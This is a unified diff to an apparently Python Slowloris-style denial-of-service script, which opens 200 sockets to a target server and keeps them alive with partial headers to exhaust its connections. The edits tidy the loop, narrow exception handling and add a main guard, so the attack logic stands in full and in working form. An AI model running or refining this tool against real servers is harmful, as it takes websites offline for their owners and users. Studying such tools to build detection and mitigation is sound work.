@@ -30,6 +30,7 @@ def main():
     if len(sys.argv) != 2:
         print("Usage: {} example.com".format(sys.argv[0]))
         return
+
     ip = sys.argv[1]
     socket_count = 200
     log("Attacking {} with {} sockets.".format(ip, socket_count))
@@ -45,17 +46,21 @@ def main():
 
     while True:
         log("Sending keep-alive headers... Socket count: {}".format(len(list_of_sockets)))
-        for s in list_of_sockets:
+        for s in list(list_of_sockets):
             try:
                 s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
             except socket.error:
                 list_of_sockets.remove(s)
-        for i in range(socket_count - len(list_of_sockets)):
+
+        for _ in range(socket_count - len(list_of_sockets)):
             log("Recreating socket...")
             try:
                 s = init_socket(ip)
                 if s:
                     list_of_sockets.append(s)
-            except:
-                pass
+            except socket.error:
+                break
         time.sleep(15)
+
+if __name__ == "__main__":
+    main()
